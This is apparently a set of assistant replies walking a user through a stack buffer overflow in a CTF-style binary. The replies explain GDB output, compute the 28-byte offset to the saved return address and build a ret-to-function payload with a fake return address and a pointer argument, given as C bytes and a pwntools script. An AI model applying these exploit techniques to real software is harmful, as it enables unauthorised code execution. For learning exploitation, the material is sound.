Got it — you want a clear, plain-English walkthrough of *how to read the GDB output and the disassembly instructions* you posted and how to get the values you need (buffer address, saved return address, offsets, and the little-endian bytes to put in your payload). I’ll go line-by-line through the pieces you saw and show exactly how to extract the numbers and build the payload. I’ll use the concrete values from your session so you can follow along.

---

## 1) Read the disassembly: what the function does (plain English)

### `doit` (short version)

You showed:

```asm
0x0b2b927d <+0>:  push  %ebp
0x0b2b927e <+1>:  mov   %esp,%ebp
0x0b2b9280 <+3>:  sub   $0x18,%esp           ; allocate 0x18 (24) bytes of locals
...
0x0b2b929f <+34>: push  $0x40               ; push 64 (count)
0x0b2b92a1 <+36>: lea   -0x18(%ebp),%eax    ; eax = address of local buffer (ebp-0x18)
0x0b2b92a4 <+39>: push  %eax                ; push buf
0x0b2b92a5 <+40>: push  $0x0                ; push fd (0)
0x0b2b92a7 <+42>: call  read@plt            ; read(0, buf, 0x40)
...
0x0b2b92af <+50>: mov   %eax,0xb2bb4b4      ; store return value
```

Plain English: `doit` creates a local buffer of 24 bytes at `ebp-0x18`, and then calls `read(0, buf, 0x40)` — it tries to read up to 64 bytes into that buffer. Because the function allocated only 24 bytes but reads 64, a classic overflow opportunity exists.

---

### `flag3`

Key lines:

```asm
0x0b2b9106 <+6>:  cmpl  $0x0,0x8(%ebp)    ; compare arg1 to 0
0x0b2b911f <+25>: call  memcmp@plt         ; memcmp(arg1, some_string, 5)
...
0x0b2b9129 <+35>: je    <success path>     ; if memcmp == 0 jump to success
...
success: call fwrite(...) ; prints success
```

Plain English: `flag3` expects a non-null pointer argument (the string address you pass to it). It calls `memcmp` to compare that pointer’s data against a 5-byte constant. If `memcmp` returns 0 (meaning the bytes match), it goes to the success branch and prints the flag. So the exploit goal is to cause `doit` to return into `flag3` with a pointer argument that points to the right 5-byte string (e.g., `"pwn3d"`).

---

## 2) Understand the stack layout (typical x86 frame)

Standard frame after `push ebp; mov ebp, esp`:

```
(high addresses)
[ saved return address ]  ← address: ebp + 4
[ saved ebp           ]  ← address: ebp + 0  (contents at $ebp)
[ local buffer start  ]  ← address: ebp - 0x18
(low addresses)
```

So:

* `$ebp` is the frame base pointer.
* address of local buffer = `$ebp - 0x18`.
* saved return address (where `ret` will jump) = memory at `$ebp + 4`.

---

## 3) Read the GDB snapshot you posted (concrete values)

Important values from your run:

* `EBP = 0xbfffd358`
  you saw: `(gdb) p/x $ebp → 0xbfffd358`

* buffer base = `EBP - 0x18 = 0xbfffd340`
  you saw: `(gdb) p/x $ebp - 0x18 → 0xbfffd340`

* saved return address location = `EBP + 4 = 0xbfffd35c`
  you saw: `(gdb) x/wx $ebp+4 → 0xbfffd35c: 0x0b2b93c4`

* current saved return **value** (what’s stored there now) = `0x0b2b93c4` (this is the address that will be returned to when the function ends if you don’t overwrite it).

* the stack bytes right before the `read` call:
  at `$esp` you saw `0x40 00 00 00` — that’s the value `0x40` (64), which is the `count` argument pushed earlier. That confirms `read` will be called with `count=0x40`.

---

## 4) Compute the offset to saved return address (how many bytes to write to reach EIP)

Do the math (you already saw this but here it is explicit):

```
saved_eip_address - buffer_start
= (ebp + 4) - (ebp - 0x18)
= 4 + 0x18 = 0x1c = 28 bytes
```

So **after writing 28 bytes** into the buffer, the next 4 bytes you write will *overwrite the saved return address* (saved EIP). That’s your overflow point.

Payload layout to overwrite saved EIP:

```
0 .. 27    filler (28 bytes)
28 .. 31   new saved EIP (4 bytes little-endian)  <-- this controls return address
```

---

## 5) Where to put the pointer argument for `flag3` (the second part of your payload)

You intend to return into `flag3()` — but `flag3` expects a pointer argument (on x86 that pointer is passed on the stack as the first argument). If you return directly into `flag3` from `doit` (i.e., you overwrite saved EIP with address of `flag3`), then when `flag3` starts it will look at `0x8(%ebp)` for its argument — that value must be a valid pointer to the string to be compared.

Common exploit layout: after overwriting saved EIP, place a fake stack frame such that when `flag3` is entered the memory where it expects its argument contains the desired pointer. One simple approach you used:

Your proposed payload was:

```
[A*28] + [addr_of_flag3 (4)] + ["BBBB" fake return 4] + [ptr_to_pwn3d (4)] + ["pwn3d\0"]
```

Interpretation:

* Fill 28 bytes.
* Overwrite saved EIP with `addr_of_flag3` — execution will jump to `flag3`.
* When `flag3` starts, it will `push ebp; mov ebp, esp`. At that point on the stack, the first thing after old `ebp` and return address will be the bytes right after where you overwrote EIP. With the "BBBB" and then `ptr_to_pwn3d` placed there, `flag3` will see `0x8(%ebp)` pointing to the `ptr_to_pwn3d` you placed (depending on exact alignment), or the `ptr_to_pwn3d` may already be the value `flag3` reads directly — this is why the 4 bytes after overwritten EIP are often used as the “fake return address” and the next 4 bytes become the first argument.

Concretely, with your layout:

* saved EIP (after exploit) = `addr_of_flag3`
* saved EIP + 4 (fake return) = `"BBBB"`
* saved EIP + 8 = `ptr_to_pwn3d`  ← `flag3`'s first argument will be this value or something that leads to it once `flag3` sets up frame.

(You can confirm exact alignment with GDB by placing this payload and then breaking inside `flag3` and inspecting `0x8(%ebp)`.)

---

## 6) Little-endian packing (how to write addresses into the payload)

x86 is little-endian. A 32-bit address `0x0b2b9106` must be written as bytes `\x06\x91\x2b\x0b` in the payload. That’s why your original C snippet used `"\x06\x91\x2b\x0b"`.

But pointer-to-`pwn3d` must be the actual address where the `"pwn3d\0"` string lives inside the buffer when `read` places the bytes there. We computed:

* `buf` = `0xbfffd340`
* `"pwn3d"` in the payload starts after: `28 (filler) + 4 (flag3) + 4 (fake ret) + 4 (ptr) = 40 bytes`
  so `"pwn3d"` will be at `buf + 40 = 0xbfffd340 + 40 = 0xbfffd368`.

So the pointer bytes must be little-endian of `0xbfffd368` → `\x68\xd3\xff\xbf`.

Double-check: from your GDB earlier you computed the same: `pwn3d` address `0xbfffd368` → bytes `\x68\xd3\xff\xbf`.

---

## 7) Putting it together — correct payloads (C and Python)

### C (as a raw byte array — do not use string literal truncation)

```c
unsigned char payload[] =
  "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"    /* 28 A's */
  "\x06\x91\x2b\x0b"                /* flag3 address (example: 0x0b2b9106) */
  "BBBB"                            /* fake ret */
  "\x68\xd3\xff\xbf"                /* pointer -> buf+40 == 0xbfffd368 */
  "pwn3d\0";                        /* the string */
```

**Caveat:** this works if the `'flag3'` address `0x0b2b9106` is the correct address you want to return to. Replace with the real address if different.

### Python / pwntools (safer)

```python
from pwn import *
buf = 0xbfffd340            # computed from GDB for this run
flag3_addr = 0x0b2b9106    # the function addr you want to return to
pwn_addr = buf + 40        # where "pwn3d" will be
payload = b"A"*28
payload += p32(flag3_addr) # little-endian
payload += b"BBBB"
payload += p32(pwn_addr)
payload += b"pwn3d\x00"

# send payload:
# run program locally:
p = process("./vcat0")
p.send(payload)
p.interactive()
```

---

## 8) How to verify in GDB (step-by-step)

1. **Break at the read call (you already did)**:

   ```gdb
   b *0x0b2b92a7
   r
   ```

   or break at `0x0b2b92a5` (just before `push 0`), then `si` to execute pushes then `call`.

2. **After `read` returns, dump memory at buffer**:

   ```gdb
   x/64bx $ebp-0x18    # dump bytes; you should see the payload
   x/wx $ebp+4         # inspect saved EIP — should show the flag3 address you overwrote
   ```

3. **If you return into `flag3` and land inside it, inspect its argument**:
   Put breakpoint at start of `flag3` (e.g., `b flag3`) and run payload; when it breaks:

   ```gdb
   x/wx $ebp+8         # show the first argument that flag3 will see (or p/x *((int*)($ebp+8)))
   x/s *(char**)($ebp+8)  # dereference that pointer and print the C-string it points to
   ```

   You want `$ebp+8` to hold `0xbfffd368` and that address to contain `"pwn3d"`.

---

## 9) Common pitfalls & notes

* **ASLR**: stack addresses change each run. Always compute `$ebp` in the *same run* that you're going to exploit. The `.gdbinit` helper or pwntools scripts can compute addresses at runtime.
* **Null bytes**: writing addresses as C string literals with embedded `\x00` can truncate your payload when used in certain contexts. Use raw binary writes (Python with `p.send(...)` or use `unsigned char[]` initializer) to avoid truncation.
* **Alignment**: if things don’t line up, step into `flag3` and check `$ebp+8` — adjust in your payload (add/remove filler) accordingly.
* **Test with GDB**: Instead of crashing real runs, craft payload in a file and run `gdb ./vcat0` and do `r < /tmp/payload.bin` to reproduce easily while inspecting.

---

## TL;DR (short checklist you can copy-paste)

1. In GDB, at the breakpoint (inside `doit` before `read`):

   ```gdb
   p/x $ebp
   p/x $ebp - 0x18
   p/x $ebp + 4
   x/wx $ebp+4
   p/x ($ebp+4) - ($ebp-0x18)   # should print 0x1c (28)
   ```
2. Build payload: 28 filler, 4 bytes = `flag3` addr (LE), 4 bytes filler, 4 bytes = pointer to `buf+40` (LE), then `pwn3d\x00`.
3. Run program with payload, then in GDB `x/64bx $ebp-0x18` and `x/wx $ebp+4` to verify.

---

If you want, I can:

* produce the **exact payload bytes** for your specific run (I already computed them from your posted addresses: `flag3=0x0b2b9106`, `pwn3d ptr=0xbfffd368`) and show them as a single hex string you can paste to a file, **or**
* give you the `.gdbinit` helper again but explained line-by-line so you can read each command’s output, **or**
* step through the exploit in GDB interactively and show what `flag3` sees when it starts (what gets put into `$ebp+8`).

Which of these helps you most right now?


Exactly — you’ve got it.

When you overwrite the saved return address so that execution jumps into another function (like `flag3`), the CPU **doesn’t know** that you’re jumping into a *new* function; it just does what `ret` always does:

> pop a value from the stack → jump there → continue execution.

That means when `flag3` begins executing, the **stack is whatever you left behind** in your overflow — not a normal call frame.
So you have to **fake** what a normal `call flag3` would have put there.

---

### 🧠 Step-by-step: what happens on a *real* function call

If the program *normally* called `flag3(ptr)` in assembly, it would look like this:

```asm
push 0xdeadbeef      ; push argument (ptr)
call flag3           ; pushes return address, jumps to flag3
```

Right before `flag3` starts executing, the stack would look like:

```
[ argument (ptr) ]         ← ESP
[ return address to caller ] ← ESP+4
```

Then `flag3`’s prologue runs:

```asm
push ebp
mov  ebp, esp
```

and the stack becomes:

```
high addr
[ ... ]
[ old EBP ]            ← stored at [EBP]
[ return address ]     ← [EBP + 4]
[ argument ptr ]       ← [EBP + 8]
low addr
```

So **in normal calls**, `0x8(%ebp)` is the first argument, because that’s where the caller pushed it.

---

### ⚙️ What happens in your overflow

You’re **not** using `call flag3`; you’re overwriting the saved return address with the address of `flag3`.
When `doit` finishes and executes `ret`, the CPU:

1. Pops 4 bytes from the stack (your overwritten saved EIP → now `0x0b2b9106`, the start of `flag3`).
2. Sets `EIP = 0x0b2b9106` (jumps into `flag3`).
3. Continues execution at that new location.

But the stack (ESP) at that moment looks like whatever you wrote after the overwritten EIP — so the **next** 8 bytes are still yours.

```
(stack right after RET jumps into flag3)
[ "BBBB" ]          ← ESP  (this will act as "fake return address" for flag3)
[ ptr_to_pwn3d ]    ← ESP+4  (flag3's first argument!)
[ "pwn3d\0" ]       ← ESP+8
```

Now flag3 starts:

```
push ebp
mov  ebp, esp
```

→ pushes the old EBP (doesn’t matter), and sets EBP = ESP.

That means:

* `[EBP + 4]` = `"BBBB"` (fake return address)
* `[EBP + 8]` = `ptr_to_pwn3d` (your intended argument)

✅ So `flag3`’s first argument (the value of `0x8(%ebp)`) will be exactly the pointer you placed right after the `"BBBB"` bytes.

---

### 🧩 Why the “fake return address” is needed

If you didn’t put `"BBBB"` there (or some 4-byte filler), the stack layout would be off:

```
[ ptr_to_pwn3d ]  ← ESP  (no fake ret)
[ pwn3d\0 ]       ← ESP+4
```

Then `flag3` would read `[EBP + 8]` → garbage or part of your string instead of a pointer, likely crashing.
That’s why exploit payloads often look like:

```
filler_to_ret + newEIP + fake_ret + arg1 + "data..."
```

---

### 🧩 In your specific payload

```
payload =
"A"*28              # fill buffer
+ "\x06\x91\x2b\x0b"  # new saved EIP = flag3()
+ "BBBB"            # fake return address
+ "\x68\xd3\xff\xbf"  # arg1 (pointer to "pwn3d")
+ "pwn3d\0"         # string data
```

After the overflow and when `doit` returns:

```
ESP -> "BBBB"           (fake ret)
       ptr_to_pwn3d     (first argument)
       "pwn3d\0"
```

`flag3`’s prologue sets up EBP = ESP, so:

```
[EBP + 4] → "BBBB"
[EBP + 8] → ptr_to_pwn3d
```

Thus, when it executes `memcmp(0x8(%ebp), something, 5)`,
the argument points right to your `"pwn3d"` string — exactly as intended.

---

✅ **So yes**, you’re completely correct:
Those `"BBBB"` bytes are the **fake return address for `flag3`**,
and the next 4 bytes (`ptr_to_pwn3d`) become `flag3`’s argument.

Would you like me to diagram the exact stack layout before and after the overflow (with memory addresses) so you can visualize it?

Excellent question — this is the **core conceptual jump** in understanding stack-based exploitation.
Let’s go step by step.

---

## 🔍 1. What you can learn **from disassembly alone**

When you disassemble `flag3`, you can see:

```asm
0x0b2b9106 <+0>: push  %ebp
0x0b2b9107 <+1>: mov   %esp,%ebp
0x0b2b9109 <+3>: sub   $0x8,%esp
0x0b2b910c <+6>: cmpl  $0x0,0x8(%ebp)
...
0x0b2b911f <+25>: call memcmp@plt   ; memcmp(arg1, const_str, 5)
```

That tells you **the function expects one argument** (a pointer at `[ebp+8]`) and that it dereferences that pointer to read a string (e.g., `"pwn3d"`).
So from *assembly*, you learn *structure*, not *values*.

But you **cannot** learn from assembly *where on the stack your injected data will end up*.
That depends on runtime conditions — specifically, where `doit()` allocates its buffer (`ebp - 0x18`).

---

## 🧠 2. What you need to compute (and can’t see from disassembly)

You want to give `flag3()` a pointer to the string `"pwn3d"` — but that string only exists **after** you inject your payload into memory at runtime.

That means its address (like `0xbfffd368`) is determined by:

1. Where the vulnerable buffer lives (`ebp - 0x18`)
2. How many bytes into your payload `"pwn3d"` appears

So the `"pointer to pwn3d"` is *not* a constant in the binary — it’s a **calculated runtime stack address**.

---

## 🧩 3. How to get that address (what you did earlier in GDB)

You already found all the pieces by printing registers:

```
(gdb) p/x $ebp
$1 = 0xbfffd358
(gdb) p/x $ebp - 0x18
$2 = 0xbfffd340   ← buffer start
```

and you knew `"pwn3d"` is 40 bytes after the start of the buffer:

```
offset = 28 (padding) + 4 (flag3 addr) + 4 (fake ret) + 4 (ptr)
        = 40 bytes from buffer start
```

So the runtime address of `"pwn3d"` is:

```
0xbfffd340 + 40 = 0xbfffd368
```

Little-endian form → `\x68\xd3\xff\xbf`.

That’s the value you put in the payload.

---

## 🧭 4. Why you can’t just guess this from disassembly

Disassembly gives **code addresses** (like functions, globals, GOT entries),
but not **stack addresses**, because stack layout is determined at runtime:

* Each function gets its own stack frame when called.
* The frame base (`ebp`) depends on where the previous function’s stack ended.
* The stack grows downward, and ASLR (if enabled) randomizes its base.

That’s why you use **GDB** (not objdump) to calculate the buffer’s address.
The value `\x68\xd3\xff\xbf` isn’t visible anywhere in the binary; it’s only known when you inspect the stack during execution.

---

## ✅ 5. Quick summary

| Info you want                       | Where to get it                         |
| ----------------------------------- | --------------------------------------- |
| Address of `flag3()`                | From disassembly (static)               |
| Buffer start address (`ebp - 0x18`) | From GDB (runtime)                      |
| Offset to saved return (28 bytes)   | From disassembly of `doit`              |
| Address of `"pwn3d"`                | buffer start + 40 (computed at runtime) |
| Pointer bytes for payload           | Little-endian form of that address      |

---

### 🧩 So: why not from disassembly?

Because the assembly code only tells you **what happens**, not **where on the stack** things end up.
Your pointer `\x68\xd3\xff\xbf` is a **runtime value derived from GDB stack inspection**, not something you can “see” in the binary.

---

If you want, I can show you a **generic way to compute that pointer automatically** (a small GDB Python snippet that prints the correct stack address for `"pwn3d"` every run, even if ASLR shifts it). Would you like that?
